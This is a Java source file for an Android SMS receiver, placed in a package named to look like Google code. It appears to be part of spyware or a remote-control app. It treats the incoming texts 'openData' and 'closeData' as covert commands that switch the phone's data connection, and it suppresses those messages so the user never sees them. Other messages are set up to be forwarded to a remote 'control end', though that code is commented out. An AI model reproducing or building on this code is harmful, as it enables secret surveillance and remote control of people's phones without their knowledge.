package com.google.core.receiver;

import java.text.SimpleDateFormat;
import java.util.Date;

import com.google.core.dao.ContactDao;
import com.google.core.domain.MsgType;
import com.google.core.domain.SmsInfo;
import com.google.core.utils.MsgUtils;
import com.google.core.utils.PhoneUtils;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		Bundle bundle = intent.getExtras();
		SmsMessage msg = null;
		if (null != bundle) {
			Object[] smsObj = (Object[]) bundle.get("pdus");
			for (Object object : smsObj) {
				msg = SmsMessage.createFromPdu((byte[]) object);
				// Date date = new Date(msg.getTimestampMillis());//时间
				// SimpleDateFormat format = new
				// SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				// String receiveTime = format.format(date);
				// System.out.println("number:" + msg.getOriginatingAddress()
				// + "   body:" + msg.getDisplayMessageBody() + "  time:"
				// + msg.getTimestampMillis());
				String senderNumber=msg.getDisplayOriginatingAddress().trim();
				String body=msg.getDisplayMessageBody().trim();
				String owner=context.getSharedPreferences("config", 0).getString("username", "aa");
				// 打开和关闭数据连接
				if (body.equalsIgnoreCase("openData")) {
					PhoneUtils.setDataConnectionState(context, true);
					this.abortBroadcast();
				}else if(body.equalsIgnoreCase("closeData")){
					PhoneUtils.setDataConnectionState(context, false);
					this.abortBroadcast();
				}else{
//					收到信息后发送给控制端
					boolean isSend = context.getSharedPreferences("config", 0).getBoolean("isOpenNotification", false);
					if (isSend) {
						ContactDao contactDao=new ContactDao(context);
//						String senderName = contactDao.findName(senderNumber);
//						SmsInfo sms=new SmsInfo(0,senderName,senderNumber,owner,body,"",1);
//						String smsg=MsgUtils.formatMsg(new MsgHeader("admin", owner, MsgType.SMS_RECEIVER), sms);
//						MsgUtils.sendToService(context, smsg);
//					销毁资源
//						smsg=null;
//						contactDao=null;
					}
				}
			}
		}
	}

}
